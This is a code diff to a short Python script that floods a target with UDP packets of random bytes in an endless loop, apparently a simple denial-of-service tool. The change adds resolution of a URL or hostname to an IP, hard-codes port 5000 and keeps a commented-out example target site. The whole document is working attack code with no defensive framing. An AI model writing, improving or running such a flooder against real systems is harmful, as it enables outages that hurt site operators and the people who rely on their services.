@@ -4,6 +4,14 @@ import socket
 import random
 from datetime import datetime
 
+def getIP(site):
+  try:
+    site = socket.gethostbyname(site)
+  except:
+    site = socket.gethostbyname(site.split('/')[2])
+  # return f'https://{site}/'
+  return site
+
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -14,13 +22,16 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
-ip = input("IP Target : ")
-port = int(input("Port : "))
+# site = 'https://onlineforms.in/'
+site = input("IP/URL Target : ")
+ip = getIP(site)
+
+sent = 0
+port = 5000
 
 print ("Starting in 5 seconds.")
 time.sleep(5)
 
-sent = 0
 while True:
   sock.sendto(bytes, (ip,port))
   sent = sent + 1
